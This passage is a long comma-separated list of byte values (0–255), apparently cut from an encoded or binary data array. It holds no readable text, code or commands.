,199,43,62,41,23,7,2,119,120,115,83,89,79,175,189,174,147,155,136,237,230,227,209,217,201,62,38,53,27,3,9,97,102,82,93,93,177,190,188,149,157,147,245,253,236,207,217,207,51,59,42,23,7,23,114,99,118,90,67,85,188,160,170,129,138,235,252,233,215,199,192,53,56,51,29,25,15,111,123,104,80,91,76,173,161,173,145,153,138,253,230,245,216,195,201,33,42,18,29,29,116,121,124,93,93,78,168,189,174,145,132,136,243,230,240,212,194,202,44,35,47,3,6,0,98,103,106,95,94,180,189,160,138,153,136,244,230,236,210,197,204,59,36,45,23,5,16,119,122,106,86,68,86,186,173,168,130,139,137,252,254,222,216,195,42,51,34,9,26,6,117,101,103,83,90,81,179,167,173,141,134,136,241,249,237,222,216,202,57,63,46,30,0,107,123,96,74,94,68,180,166,172,145,133,135,251,228,228,214,197,208,53,39,42,12,3,12,126,120,97,90,95,77,188,163,139,155,131,244,231,228,201,218,201,53,37,44,17,26,17,113,103,109,77,70,79,177,185,168,157,152,139,248,226,244,221,195,53,32,37,22,26,28,125,127,110,72,81,74,175,186,170,142,142,143,243,250,235,204,195,205,62,56,33,26,31,1,117,126,84,95,67,170,189,161,137,154,137,245,229,230,215,196,202,50,38,48,23,4,9,108,108,104,67,68,65,191,191,174,156,128,235,250,227,215,199,199,54,59,51,19,24,18,117,112,108,78,68,72,179,186,172,146,132,150,254,225,232,194,195,204,33,43,31,0,8,116,121,124,87,91,83,188,191,175,143,145,141,240,251,234,217,218,206,52,39,54,31,6,21,118,107,105,65,66,183,190,189,159,146,156,245,249,237,200,216,205,47,61,37,19,27,4,120,103,119,84,71,75,163,165,173,159,159,128,249,254,215,212,192,42,56,35,23,6,9,118,120,114,81,92,76,174,163,168,141,132,140,236,231,239,221,216,204,34,37,46,28,30,116,125,99,74,90,72,169,185,170,150,133,138,239,254,235,211,219,202,49,36,55,16,5,11,99,96,106,92,95,79,188,190,149,148,128,234,249,224,215,198,204,54,56,50,17,27,12,110,103,104,77,66,76,177,185,163,156,134,149,248,226,233,193,202,48,61,61,16,24,28,118,115,115,80,91,76,175,176,175,142,130,138,240,250,226,217,196,214,61,37,40,2,7,12,127,126,86,64,71,177,186,188,146,155,141,232,255,236,210,196,204,55,37,48,24,7,23,114,98,107,67,69,72,188,191,175,156,131,235,245,229,215,199,198,48,38,38,19,5,11,113,122,113,80,70,77,173,164,163,145,153,136,249,248,225,214,223,200,57,32,11,25,29,127,115,97,73,83,70,181,165,168,147,153,145,245,228,238,205,198,200,44,36,34,30,24,8,124,97,116,92,64,182,160,160,146,154,156,244,254,243,212,209,210,58,59,47,14,1,13,112,122,99,85,68,86,191,162,181,150,132,148,250,224,213,192,196,55,39,34,19,27,19,118,127,114,80,95,81,177,163,174,141,129,138,236,225,236,222,216,201,60,33,52,21,2,118,96,100,82,90,92,179,184,179,144,158,146,244,249,239,206,192,204,48,58,42,20,4,22,127,96,117,90,75,84,184,161,149,128,134,234,253,227,212,198,205,50,37,39,21,4,5,118,101,112,80,68,87,177,162,171,131,134,140,226,228,239,193,199,51,62,61,31,26,28,125,124,110,72,95,79,177,164,172,146,134,144,243,226,234,204,205,214,58,35,53,25,2,10,97,102,86,93,93,178,190,161,137,153,140,232,254,233,207,216,200,48,59,45,16,26,13,116,100,118,86,64,85,186,170,180,155,134,245,224,230,202,219,201,52,38,43,16,5,15,114,121,113,82,67,77,173,161,175,140,135,141,254,248,235,223,193,212,63,32,22,0,0,114,122,124,87,91,83,181,190,178,145,153,143,238,229,237,205,206,206,49,57,46,28,24,12,120,127,109,94,64,171,186,163,138,152,135,244,230,238,209,197,207,58,36,36,17,5,16,113,122,111,88,68,86,183,164,171,130,132,136,252,254,209,223,192,42,57,35,9,26,7,104,113,110,81,68,74,176,166,176,153,132,138,236,237,238,195,193,207,34,43,40,31,30,116,126,125,80,94,65,169,189,170,136,157,135,239,254,239,208,219,207,45,35,44,17,25,2,123,120,105,89,95,73,185,163,139,154,131,234,251,231,212,198,205,52,59,50,16,24,12,110,103,111,80,90,76,181,185,162,152,152,139,253,225,244,217,194,54,32,34,19,26,28,115,126,115,82,95,82,181,187,175,142,133,144,245,227,234,204,195,201,35,33,32,2,2,13,127,126,85,64,70,176,186,188,148,154,141,232,253,233,207,208,206,51,59,42,19,26,11,120,100,118,89,69,75,162,165,161,129,139,245,253,253,210,216,220,61,50,51,18,26,12,111,113,108,83,91,79,178,167,183,151,134,150,251,237,245,216,192,202,33,35,20,0,0,115,122,124,87,95,83,183,176,178,151,155,143,238,231,239,205,194,205,49,57,40,30,6,21,125,107,116,92,65,182,160,169,151,135,130,253,230,236,221,216,210,52,58,44,14,0,9,112,122,104,83,89,76,185,184,168,157,129,148,249,227,203,219,194,55,39,35,22,6,11,125,101,105,80,90,81,177,187,169,149,135,151,244,225,246,221,204,213,62,39,42,1,2,117,96,97,80,90,92,178,179,174,136,157,142,242,228,229,208,198,208,50,39,55,21,2,22,126,102,107,66,66,72,188,190,147,153,128,234,243,229,201,217,198,40,58,43,17,4,8,115,123,101,85,71,87,178,166,182,152,140,149,250,225,234,193,197,43,62,38,23,7,7,117,120,115,84,89,79,175,190,169,147,155,141,243,250,235,217,196,214,63,38,43,2,2,9,124,126,94,89,64,170,178,164,137,146,137,232,249,236,209,196,201,51,38,48,23,5,10,108,100,108,67,76,65,162,166,170,159,158,246,224,229,208,218,220,51,57,51,28,25,15,111,124,104,80,91,74,176,186,169,152,132,150,252,237,232,194,196,200,60,62,23,25,0,106,120,100,73,83,71,181,165,172,154,153,145,241,231,237,205,206,206,49,57,40,28,24,13,119,127,107,92,64,171,185,160,151,135,137,241,251,243,209,221,210,54,48,49,18,3,14,109,98,119,81,77,75,163,167,172,130,139,136,252,254,214,216,195,42,62,33,9,31,8,117,101,106,83,90,81,178,165,173,141,132,136,241,249,233,219,216,203,54,34,52,27,11,118,96,104,95,71,68,177,187,179,151,154,146,245,254,241,219,199,206,45,46,55,22,2,11,99,99,105,92,95,72,181,190,150,152,131,234,251,252,209,220,206,40,60,43,15,30,4,110,100,111,83,90,67,179,185,170,150,133,149,250,234,233,193,203,62,32,41,21,26,28,125,127,115,83,94,82,178,185,175,142,132,142,240,250,232,212,196,214,61,39,53,29,11,20,125,102,85,64,64,183,167,163,146,155,147,246,249,236,207,218,204,51,59,43,21,4,23,113,102,118,86,76,72,162,164,168,159,158,254,245,253,209,216,194,41,59,43,8,30,6,114,100,107,83,69,80,183,175,183,145,128,139,227,237,234,194,199,192,33,38,22,30,29,118,121,97,73,83,72,181,165,174,149,132,136,250,251,238,210,196,215,53,39,54,26,2,8,98,101,97,92,94,179,188,160,138,158,132,244,230,237,214,197,199,59,57,49,22,7,14,109,110,98,76,69,78,190,184,173,157,159,141,245,227,203,218,200,55,39,33,23,27,19,112,124,111,79,93,72,174,175,164,141,142,136,242,249,226,222,197,213,59,36,41,1,5,116,96,98,94,71,68,183,184,179,146,133,134,251,249,241,208,206,205,45,38,43,17,25,10,123,101,117,92,66,84,186,170,150,128,137,255,250,252,212,216,206,40,48,42,18,4,9,113,123,100,86,71,87,176,167,168,131,128,137,255,255,233,216,195,43,52,36,10,19,6,105,126,107,86,69,76,178,185,177,148,129,141,237,231,237,204,193,203,62,56,44,28,1,20,125,96,75,84,73,183,167,163,156,155,147,243,240,242,208,221,204,46,33,40,13,1,12,113,121,106,95,70,85,184,163,169,129,128,244,253,253,208,222,220,51,50,46,8,29,14,113,100,105,83,70,80,177,163,170,140,135,142,227,224,224,194,195,203,63,62,31,0,0,127,122,124,83,95,83,179,185,175,143,156,143,240,251,229,211,218,194,56,36,54,24,13,8,98,102,106,92,94,180,191,160,138,155,132,233,249,232,213,197,204,50,58,49,16,6,13,109,97,110,81,89,72,185,184,173,153,159,136,249,224,203,223,192,42,59,39,20,6,7,112,101,102,85,68,79,177,165,176,144,135,151,243,227,235,195,196,201,60,63,40,29,3,107,116,99,84,71,64,183,166,172,156,152,146,250,248,239,206,199,204,48,58,45,21,4,22,119,103,117,93,68,84,187,171,150,128,128,247,231,232,208,219,211,55,61,50,22,31,17,117,100,110,77,69,74,172,167,162,158,152,128,247,226,244,222,202,43,56,35,20,7,7,105,114,104,85,69,77,179,186,177,148,133,141,237,227,239,210,217,201,61,56,42,22,2,20,120,98,85,64,73,183,186,188,151,159,142,232,249,232,207,218,202,46,38,46,19,26,8,113,121,105,92,69,85,190,166,180,153,132,235,249,227,212,199,196,55,38,42,19,24,18,119,121,111,78,69,68,173,164,174,146,153,136,227,229,238,223,223,206,52,35,11,20,0,119,103,98,81,88,83,189,189,178,148,159,145,250,229,238,205,206,203,49,57,43,26,5,21,120,102,116,91,69,171,184,161,148,135,132,244,230,239,209,216,210,50,57,47,14,0,10,109,101,104,82,89,66,189,184,169,152,130,148,249,235,214,192,192,55,58,60,23,25,13,104,122,108,79,81,74,179,187,173,147,132,151,241,231,235,195,195,202,63,63,43,24,30,116,123,125,82,88,66,169,178,179,149,157,143,239,240,233,206,196,203,45,38,47,18,25,14,99,97,109,95,95,77,188,160,139,153,136,234,242,228,215,198,207,54,37,44,21,25,17,113,103,110,77,71,74,177,185,172,156,134,149,250,225,244,212,197,43,60,35,20,7,6,117,123,115,83,90,79,175,188,174,142,129,139,237,239,239,210,217,203,35,36,46,31,31,8,121,126,82,85,93,180,184,162,137,154,140,232,254,233,210,196,197,59,38,48,18,15,23,117,96,104,67,64,85,185,171,169,129,130,245,254,253,215,219,193,41,62,43,21,5,14,113,100,105,85,91,68,176,164,183,144,132,139,227,231,234,223,223,201,57,62,31,26,29,117,126,98,73,95,83,181,177,175,143,152,136,238,238,228,205,192,200,50,57,44,3,12,15,127,127,106,93,64,171,186,169,138,153,131,247,230,237,214,197,207,58,57,49,26,14,13,109,110,98,76,68,78,190,184,175,159,159,137,244,254,215,221,195,42,50,60,19,31,14,104,126,107,79,81,69,174,162,174,147,154,137,236,229,236,222,216,201,62,33,52,30,5,107,127,98,84,71,73,180,166,170,156,152,146,250,249,239,206,194,196,45,32,40,18,25,13,126,120,110,89,66,84,190,160,149,128,135,255,231,227,214,219,211,50,61,50,23,31,17,119,103,110,77,66,74,172,160,175,158,152,142,253,255,225,213,222,55,57,35,10,27,2,105,115,103,85,69,79,179,186,177,147,143,144,249,226,233,204,193,203,35,33,47,31,31,9,127,96,75,88,64,183,167,161,145,155,147,244,253,242,210,223,209,52,39,46,13,7,9,113,121,106,92,69,85,188,167,180,154,132,235,250,226,212,199,197,52,38,41,17,24,18,114,124,113,87,79,80,178,162,169,140,132,137,227,229,239,223,223,207,52,35,11,20,1,119,103,96,80,88,83,180,188,178,155,144,140,238,229,238,211,218,206,48,36,54,23,0,8,98,98,108,65,68,176,160,166,149,153,156,241,250,238,200,208,203,50,36,37,23,27,5,121,122,111,83,71,86,191,184,175,157,130,148,250,231,203,221,201,42,60,35,23,6,12,118,101,107,85,89,81,182,174,173,141,128,139,241,249,232,219,198,213,58,38,52,29,11,118,96,104,87,89,92,183,184,174,136,154,141,242,228,229,209,219,204,56,58,41,19,7,22,121,101,104,66,68,77,188,190,149,154,157,243,242,252,210,217,205,40,59,50,27,28,12,110,103,108,83,90,73,177,164,182,156,128,136,226,234,233,193,202,63,61,61,20,18,1,105,115,111,85,69,74,183,186,177,154,130,144,248,225,234,204,195,201,61,56,47,28,2,20,116,96,86,64,68,181,167,167,147,134,143,241,251,242,214,196,203,54,38,48,21,5,23,114,109,118,93,71,75,162,170,169,129,132,240,253,253,214,219,194,41,51,47,21,5,6,113,121,113,90,67,80,183,161,170,140,141,139,253,248,234,222,194,212,57,38,22,0,4,117,103,100,93,91,83,189,186,172,143,144,132,238,224,233,208,218,195,53,57,41,22,24,13,123,97,116,84,94,181,185,160,138,147,131,233,243,239,213,197,204,54,58,49,18,4,16,113,110,106,76,67,67,190,184,160,151,159,140,254,227,203,222,196,42,61,39,9,30,14,118,101,105,90,68,69,177,166,176,147,128,151,242,226,246,222,193,203,34,32,42,28,30,115,120,96,74,82,68,169,186,168,136,155,139,241,228,239,206,193,203,48,58,41,21,25,10,126,101,117,92,70,74,161,166,150,128,132,240,250,252,220,211,206,40,61,46,18,4,10,119,102,112,86,69,87,184,162,182,155,132,139,226,224,234,220,222,63,62,32,10,24,6,105,127,103,72,80,76,177,164,168,147,134,144,247,229,234,204,204,206,35,36,33,2,3,11,127,126,86,64,67,177,186,188,157,158,147,247,251,239,207,220,201,48,59,43,21,26,11,118,100,118,92,77,72,162,161,170,156,158,255,249,224,202,219,198,41,50,41,8,16,13,113,100,100,83,70,80,183,163,170,140,128,143,227,237,239,194,195,205,63,62,23,29,0,106,125,100,84,70,71,176,165,170,155,132,137,241,229,240,216,196,215,48,35,43,3,1,9,124,127,111,95,67,171,188,165,148,135,131,241,230,239,220,216,210,52,49,44,14,6,14,112,122,111,84,68,86,189,161,181,157,138,148,254,225,213,192,198,55,58,60,29,31,14,104,127,106,79,92,75,174,167,169,147,154,139,241,249,236,216,197,213,56,35,42,1,10,119,125,125,85,95,66,169,190,179,149,159,143,239,253,228,211,219,202,51,39,55,21,1,11,99,99,106,66,71,64,188,190,150,156,131,234,243,225,212,198,206,49,56,50,20,29,17,119,97,112,88,68,73,172,161,182,157,129,136,226,227,233,223,222,51,53,61,19,24,2,105,114,115,86,94,79,175,187,164,147,155,132,240,231,247,215,198,203,35,45,40,2,3,14,124,126,80,85,64,170,190,162,148,134,134,240,248,242,209,219,209,52,32,45,13,15,11,114,121,98,95,69,85,189,166,169,129,138,243,224,232,208,199,200,55,56,51,22,24,18,117,123,108,78,71,76,179,186,168,153,153,136,251,230,245,216,193,212,62,36,22,0,9,127,122,124,87,88,78,168,185,170,146,132,139,243,251,232,215,199,215,53,44,43,3,0,8,127,127,105,94,67,171,184,162,138,159,136,244,230,230,215,219,210,53,57,49,27,1,13,109,103,110,76,70,77,163,167,172,156,159,137,225,227,210,221,221,62,58,34,9,30,7,104,120,106,82,68,79,174,175,164,144,154,143,249,228,246,217,205,213,61,32,41,1,10,115,96,96,94,90,92,179,187,173,136,158,143,242,228,234,215,198,208,56,35,55,24,2,22,123,103,107,66,67,74,161,170,145,157,157,241,242,225,201,222,199,40,49,44,17,4,13,110,99,106,80,90,77,185,164,182,152,131,149,254,224,233,193,192,43,60,40,23,7,3,119,120,115,87,91,79,175,176,168,147,155,141,245,250,232,216,196,214,63,38,43,2,10,9,97,100,82,93,93,178,190,188,145,146,147,245,250,236,207,223,209,49,32,45,13,4,10,114,121,98,95,69,85,188,166,170,129,139,245,224,225,222,218,220,48,59,45,8,26,15,114,100,110,81,70,80,176,165,183,151,141,139,227,226,224,223,223,204,63,35,11,25,4,119,103,102,80,70,70,179,165,172,145,154,145,241,229,240,212,195,202,44,33,47,3,13,15,98,96,109,95,94,177,160,164,144,154,156,243,251,237,200,223,206,50,36,47,22,5,16,116,122,110,86,68,86,184,165,171,130,134,136,252,254,222,217,192,42,56,34,9,26,7,117,101,103,83,90,81,180,167,173,141,132,142,241,249,232,220,216,205,56,63,46,29,0,107,122,125,86,94,65,169,178,166,149,133,140,250,228,233,214,197,208,49,36,55,17,3,11,99,96,96,95,95,73,189,163,139,158,133,247,231,233,201,219,201,53,37,39,19,26,17,122,103,109,77,71,72,177,185,163,158,152,142,249,226,244,217,195,53,32,33,23,26,28,125,126,110,72,88,72,175,188,171,142,133,136,243,250,233,204,198,207,62,56,46,30,1,20,121,100,75,84,69,180,167,165,151,134,138,252,248,242,209,209,204,46,46,37,13,1,8,113,121,109,94,88,73,184,162,180,156,131,245,224,228,214,218,220,61,63,46,8,25,11,111,112,106,78,71,72,179,186,169,145,153,142,251,229,245,214,199,212,63,43,11,26,2,116,103,99,87,70,72,179,184,178,154,145,140,238,239,234,205,193,207,50,57,40,29,24,15,121,98,116,91,75,182,160,163,148,154,156,244,249,238,200,208,202,47,49,37,19,27,11,114,100,119,87,76,86,191,161,168,130,133,140,225,225,208,192,197,50,57,60,23,6,9,114,120,114,83,92,81,186,175,176,144,133,137,236,226,246,215,194,200,34,43,33,28,30,119,116,125,81,88,66,169,190,173,136,154,134,242,228,237,210,197,208,52,36,42,12,3,9,126,120,106,91,95,73,181,163,139,149,130,244,231,226,215,219,211,55,61,47,15,31,9,110,97,106,77,78,79,178,185,174,131,132,142,255,255,225,217,222,63,58,61,17,25,2,105,114,110,72,93,72,178,164,169,155,134,144,240,238,247,211,193,203,35,33,45,2,2,0,97,107,87,94,93,178,185,161,137,153,138,245,229,233,214,196,202,53,38,48,21,4,9,108,96,107,94,88,64,185,162,180,149,129,235,254,232,202,221,194,55,38,41,8,24,8,114,100,101,82,69,80,180,174,183,152,129,136,227,229,235,194,202,192,60,62,22,30,3,106,121,97,84,70,70,183,184,178,144,156,145,244,224,240,209,194,201,44,36,40,30,24,13,123,98,116,92,68,171,180,166,138,147,130,247,230,230,212,216,210,58,62,44,14,15,9,109,100,98,76,65,72,189,184,171,156,159,139,251,227,203,222,192,52,39,34,29,6,11,113,123,114,82,93,81,179,174,173,141,134,138,242,249,237,223,197,213,61,38,41,1,6,115,96,102,81,71,68,177,184,179,144,152,146,242,253,236,206,196,207,45,37,44,12,6,15,125,120,96,66,68,64,188,190,158,153,157,254,243,252,213,223,205,40,63,50,23,16,12,110,96,101,80,90,73,177,164,182,152,128,139,226,229,236,193,195,62,61,61,16,27,2,105,123,111,85,69,71,177,185,177,144,132,144,242,239,247,208,198,200,35,45,53,24,7,9,97,101,84,64,72,176,167,163,144,152,147,247,248,242,210,209,204,46,34,41,13,2,3,108,103,111,93,88,73,191,191,175,149,131,235,253,225,212,199,198,53,59,51,28,26,12,111,112,110,78,78,75,176,186,170,147,135,150,251,230,232,194,197,205,60,62,20,25,29,115,125,124,83,88,77,168,188,178,151,158,140,238,230,232,205,195,205,44,33,47,29,24,14,98,96,110,92,94,191,184,189,144,147,156,243,249,237,200,223,207,47,58,37,19,27,4,112,100,119,80,71,75,163,167,173,159,159,142,254,254,210,212,192,42,61,36,23,6,10,118,120,114,86,92,76,174,161,175,141,135,130,236,225,239,221,216,206,34,35,32,28,30,114,121,125,87,82,92,189,185,173,136,155,146,247,240,236,206,199,205,51,58,34,16,4,22,124,96,104,66,74,75,161,166,144,157,157,255,251,226,201,211,198,40,57,43,18,4,13,116,123,101,87,90,75,181,167,182,158,134,136,226,230,236,220,222,53,57,61,21,28,28,124,126,109,72,81,76,175,189,171,147,155,133,241,228,247,210,204,214,54,39,40,2,2,20,127,106,86,64,71,182,185,188,148,155,142,232,241,234,210,196,206,54,59,36,22,26,2,112,103,118,89,77,85,190,160,169,129,129,241,224,228,222,199,199,55,56,51,22,24,15,111,113,105,83,91,72,181,186,171,152,153,140,251,230,245,218,193,212,53,42,22,0,1,118,121,124,86,83,83,178,186,175,143,157,145,250,224,237,205,196,194,49,57,41,31,5,21,124,102,105,65,75,180,160,164,145,135,135,244,248,243,212,217,207,47,48,47,19,27,8,116,122,108,87,89,76,189,166,181,157,130,137,225,227,208,221,221,49,59,34,9,25,14,117,101,109,87,90,81,187,187,172,152,135,151,249,236,235,195,192,193,34,39,45,28,30,126,126,125,84,92,92,183,184,173,136,153,142,242,228,237,209,198,208,51,32,55,24,3,22,119,103,107,66,70,73,188,190,151,159,128,234,249,229,201,210,201,40,57,45,17,4,4,110,110,106,80,90,73,177,167,182,152,132,136,226,229,235,220,222,52,62,61,18,29,1,105,123,111,86,69,74,179,185,177,154,130,141,237,230,233,204,194,205,35,32,32,31,31,14,127,99,75,85,68,183,167,167,144,134,139,253,229,234,209,218,209,55,38,45,13,2,8,113,121,104,95,70,85,190,170,180,153,129,245,224,232,202,219,198,52,38,42,20,27,18,114,122,108,78,64,79,176,186,172,148,153,141,248,229,245,221,202,201,33,39,23,29,29,119,126,97,73,93,75,168,184,167,143,145,140,240,251,238,211,199,215,52,33,43,3,12,10,98,102,97,65,74,181,190,189,147,154,156,253,249,238,200,216,206,49,36,36,26,27,11,117,100,119,84,71,86,191,162,168,130,131,136,255,254,208,213,221,52,62,33,9,26,11,104,112,105,82,68,74,187,166,176,147,134,138,236,224,239,222,216,205,58,63,45,20,30,114,125,99,74,95,66,180,166,166,144,152,146,241,252,241,218,207,208,54,36,41,12,5,8,99,96,109,95,95,78,180,163,139,158,137,234,253,228,212,198,206,40,56,38,18,4,15,112,101,112,86,79,87,176,166,171,131,141,138,226,227,224,193,199,54,62,61,31,18,28,116,127,110,72,94,75,175,190,165,142,142,140,243,250,227,208,196,214,57,32,40,2,2,13,97,102,80,64,69,179,185,188,149,134,137,242,248,242,208,218,207,46,32,36,13,6,15,113,121,106,67,66,65,191,191,160,157,128,235,253,225,215,199,199,48,59,51,16,26,18,112,127,113,87,71,78,173,163,169,145,153,141,251,229,245,223,199,212,60,37,11,24,2,116,103,98,84,70,73,179,184,178,148,152,143,238,230,228,205,197,206,50,57,34,29,24,8,121,98,116,95,64,181,160,167,150,154,156,241,255,238,200,223,204,47,57,37,19,27,9,112,100,119,85,69,75,163,167,172,159,159,142,248,254,214,219,221,55,63,34,9,27,13,117,101,106,84,89,81,180,162,176,148,129,151,242,230,232,195,205,213,59,36,41,1,6,118,126,125,87,90,65,169,187,171,150,133,142,240,228,235,218,198,208,57,39,41,12,1,10,126,120,106,93,66,84,181,190,145,155,128,234,252,225,215,198,198,53,56,50,21,27,12,110,97,105,77,68,76,172,172,169,157,152,141,254,226,244,212,196,54,32,38,21,7,1,125,102,103,86,91,82,176,185,177,150,143,141,237,239,226,209,217,194,63,37,53,25,7,10,97,102,75,92,71,183,167,162,151,152,147,245,251,239,207,222,200,51,59,37,16,26,8,119,121,106,91,70,85,190,162,180,153,134,246,224,224,210,199,201,61,38,43,22,27,18,123,120,108,78,64,74,176,186,162,148,153,130,255,229,245,218,198,202,33,36,11,24,7,119,103,98,87,88,83,189,176,178,149,155,140,238,239,240,208,207,202,44,45,42,29,24,10,126,98,116,89,65,182,160,167,149,135,132,242,230,235,208,219,210,49,57,49,27,1,13,109,99,111,76,76,66,163,162,171,156,159,128,225,226,222,221,221,62,63,60,19,26,14,104,126,106,81,68,77,174,162,164,144,154,137,242,231,246,217,198,200,34,36,43,28,30,126,125,125,83,83,65,169,185,171,150,133,138,241,249,241,218,195,205,45,36,47,12,12,2,99,109,107,92,95,74,188,190,150,154,128,234,242,224,215,198,202,60,37,47,22,26,17,112,102,112,83,64,74,172,162,170,157,152,139,254,226,244,221,193,53,32,39,20,7,4,125,123,115,92,88,76,175,176,164,142,132,143,240,250,233,212,217,204,56,37,53,25,7,10,97,96,86,93,93,180,191,161,137,146,140,232,240,232,207,220,207,48,59,37,19,26,14,118,100,118,92,77,72,162,166,160,129,139,245,254,253,208,199,201,50,59,51,23,24,12,111,127,100,78,66,72,179,186,173,145,153,130,249,229,245,220,193,202,33,35,21,29,29,112,126,97,73,91,75,168,185,166,146,132,140,247,229,240,216,199,202,44,37,45,30,24,12,125,127,109,91,94,182,185,163,138,147,130,233,242,231,213,197,204,58,57,49,18,7,13,109,101,104,82,89,75,163,165,161,159,159,143,244,227,203,213,200,42,58,37,23,6,8,117,101,108,84,89,81,187,167,174,141,130,138,241,249,226,221,197,213,57,32,52,26,5,107,124,98,84,71,73,181,187,179,149,158,143,239,249,235,206,207,196,45,46,41,18,25,13,125,120,96,86,66,84,186,171,150,128,135,247,250,252,213,222,205,40,62,44,15,30,10,115,123,109,83,68,87,180,164,171,131,128,138,255,255,224,217,222,63,59,61,30,24,2,105,126,110,85,69,76,176,185,177,145,132,144,246,225,247,216,193,200,35,35,40,2,4,14,124,126,80,89,93,177,179,188,151,153,141,232,250,236,207,220,197,51,59,47,16,4,23,112,103,107,67,68,77,191,191,174,156,158,244,251,253,213,210,193,41,50,46,21,5,6,112,121,113,80,68,80,181,174,183,146,134,136,227,224,232,194,196,205,60,62,21,31,29,119,124,124,86,94,77,168,187,175,143,152,132,243,251,233,212,218,202,56,57,44,28,6,21,119,98,116,90,69,182,160,168,151,153,156,241,248,238,200,218,202,50,36,37,16,27,10,121,122,106,82,71,86,182,165,168,130,135,141,252,254,223,223,221,54,60,60,16,24,13,104,123,108,79,88,72,179,187,174,151,154,143,249,249,238,219,198,213,60,34,52,31,4,118,96,104,82,71,64,180,187,179,150,154,143,239,241,233,206,192,203,48,58,41,17,7,22,126,102,104,66,64,77,188,190,150,158,157,241,253,252,212,218,205,40,61,47,15,17,15,115,123,111,82,90,73,185,185,173,157,134,149,249,255,224,219,195,43,60,37,10,26,9,105,120,107,86,69,71,177,164,170,154,134,144,241,230,233,204,197,203,62,56,33,26,2,20,125,102,75,84,70,170,187,161,151,134,143,244,248,242,219,218,204,46,32,47,13,6,12,108,96,106,93,88,73,191,191,173,152,131,235,253,231,202,223,198,41,63,42,22,5,14,111,120,106,83,91,72,181,186,163,152,153,139,251,229,245,222,192,212,61,37,22,0,0,118,121,124,92,90,78,168,184,170,146,132,138,247,251,238,214,218,202,52,39,54,23,5,8,98,106,109,92,94,179,184,189,144,157,156,241,249,237,200,216,210,55,59,44,14,15,9,109,100,98,76,69,73,189,184,161,156,159,143,251,227,203,219,193,52,39,36,18,6,14,119,120,114,86,90,81,182,160,173,141,142,130,241,249,227,214,216,207,59,34,52,24,1,107,120,103,74,82,67,183,166,167,148,152,146,246,252,236,206,194,200,45,38,44,12,3,9,125,120,107,66,75,75,188,190,147,153,157,246,243,252,209,222,205,40,63,50,26,30,12,110,98,108,83,90,67,183,185,170,156,133,149,247,225,244,223,202,43,63,40,23,7,6,119,123,115,83,92,79,175,187,174,142,130,138,237,239,233,210,217,201,62,56,46,29,2,20,117,97,75,88,73,170,178,164,151,134,143,247,229,239,214,217,209,53,34,48,23,1,23,115,97,104,67,68,75,162,165,160,156,158,241,253,227,202,218,193,52,38,39,23,24,18,119,122,113,84,79,80,176,164,169,140,131,136,254,248,238,219,194,212,58,33,11,31,8,106,124,98,87,70,79,182,165,169,151,153,145,242,225,240,213,206,215,51,32,40,3,2,11,98,107,110,92,94,179,188,163,138,153,129,244,230,235,215,216,210,55,57,49,20,15,13,109,100,98,81,89,75,190,165,181,159,128,137,225,230,211,192,196,48,39,40,21,24,19,113,121,111,79,88,72,179,187,172,148,154,131,246,249,239,218,198,213,56,63,32,27,3,107,122,98,74,90,65,180,166,170,144,155,146,240,250,241,208,207,205,45,36,43,18,25,3,127,101,117,94,70,73,161,166,147,128,134,241,250,252,214,216,205,40,59,44,18,4,11,118,102,112,82,66,87,180,172,182,154,133,139,226,227,234,220,222,55,56,32,10,19,4,105,122,103,72,89,75,177,164,165,144,155,140,247,231,247,216,193,214,55,37,40,2,6,13,127,126,81,93,93,176,179,161,137,157,134,245,229,237,211,217,209,55,36,45,13,2,14,108,98,109,94,88,79,191,161,180,159,130,246,224,232,213,218,220,60,57,51,16,16,18,119,121,111,78,64,77,173,165,172,145,153,139,255,230,245,221,203,212,62,33,21,0,8,116,103,100,83,91,83,182,188,178,145,154,140,238,224,232,211,218,204,52,57,47,25,5,21,126,97,106,65,69,190,160,165,149,154,156,241,249,243,212,209,210,48,57,47,14,1,14,112,122,98,84,68,86,190,162,181,150,139,148,250,225,213,192,200,42,59,40,20,6,15,116,123,114,83,88,76,174,160,168,147,154,143,236,231,236,222,216,205,62,33,52,27,0,118,96,98,82,89,92,180,190,179,157,145,143,239,250,228,211,219,201,51,39,55,16,0,11,99,102,109,66,71,64,161,162,150,158,157,243,250,225,201,211,200,53,37,45,21,4,8,122,123,101,82,68,87,181,167,182,156,130,136,226,235,225,220,222,49,61,32,10,28,3,116,102,105,85,69,79,181,185,177,144,135,142,237,228,233,209,217,201,60,37,53,23,6,20,116,106,86,64,73,183,185,188,149,154,142,232,241,235,210,196,205,52,59,36,25,26,3,115,103,118,91,69,72,162,163,175,156,158,240,255,253,211,211,220,53,57,45,8,16,12,111,125,107,83,91,77,177,164,183,144,135,139,227,226,234,223,223,201,63,62,16,20,0,106,125,97,87,70,75,181,184,178,149,155,140,238,228,234,205,206,204,49,57,47,30,6,21,122,99,105,65,67,178,189,189,149,157,156,242,252,243,208,221,204,47,61,44,19,27,9,119,103,119,80,64,86,187,165,168,130,134,138,255,254,215,222,221,55,50,33,9,25,6,117,101,105,90,68,76,182,166,176,146,130,151,249,227,235,195,199,192,63,63,46,28,3,107,126,98,87,71,69,182,166,166,147,152,146,244,249,239,206,199,206,48,58,41,20,4,22,122,97,117,90,75,84,187,160,149,128,137,247,231,224,210,219,211,49,61,50,23,24,12,110,98,105,83,90,74,179,185,174,153,133,149,248,226,234,193,193,53,61,61,21,24,1,105,120,106,72,92,70,178,164,175,155,134,144,243,231,234,204,196,201,62,56,40,27,31,10,117,126,80,95,67,170,186,161,137,153,136,245,229,232,215,196,205,59,59,40,19,4,23,114,103,118,86,76,72,162,163,168,159,158,254,245,253,222,217,194,41,50,45,8,27,6,114,100,108,82,69,80,183,164,170,140,131,143,254,248,239,219,223,193,58,62,23,30,3,106,126,97,73,83,77,181,165,172,149,132,132,245,251,232,213,196,215,49,36,54,27,3,8,98,99,105,95,94,178,180,189,159,159,130,233,254,243,211,223,207,47,56,45,16,27,5,120,122,110,84,71,86,188,165,181,150,132,137,225,235,215,222,221,52,58,33,9,25,12,117,101,109,80,68,72,181,187,173,147,132,151,242,231,246,221,193,200,34,42,44,1,11,113,96,105,82,89,92,179,166,169,146,152,146,241,248,239,206,193,203,45,47,47,18,25,15,99,101,97,95,95,79,188,160,139,155,131,247,231,225,209,216,211,48,61,50,19,16,17,123,100,110,77,69,74,177,185,171,154,133,149,252,224,244,213,196,43,57,32,20,7,2,105,125,108,85,69,72,179,186,177,149,129,144,248,228,233,204,205,200,35,36,47,31,31,0,116,99,75,92,64,183,167,162,150,152,147,245,250,242,211,208,204,46,39,44,19,26,9,112,100,118,93,64,72,162,160,172,129,134,255,224,228,213,217,220,60,38,38,16,24